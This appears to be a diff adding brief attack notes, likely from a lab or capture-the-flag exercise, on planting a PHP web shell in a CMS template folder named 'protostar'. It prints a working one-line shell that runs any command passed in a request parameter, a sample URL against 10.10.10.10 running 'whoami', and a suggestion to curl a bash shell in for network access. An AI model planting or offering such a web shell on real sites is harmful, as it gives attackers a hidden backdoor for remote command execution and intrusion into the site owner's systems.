@@ -1,0 +1,18 @@
+go to:
+
+extensions -> templates 
+go to protostar
+then edit something like index.php or we could create a new file
+
+create a file, then put the contents as something simple so we can gain command execution through the url, like the following:
+
+<?php system($_REQUEST['AndComment']); ?>
+
+this would allow us to use command execution through the following:
+
+lets use the following scenario, ive uploaded a new webpage called pwned.php to the protostar directory in order to gain a shell.
+
+http://10.10.10.10/templates/protostar/pwned.php?AndComment=whoami
+
+(or whatever command you need)
+and then you can curl a simple bash shell or whatever into it in order to gain user shell access into the network.
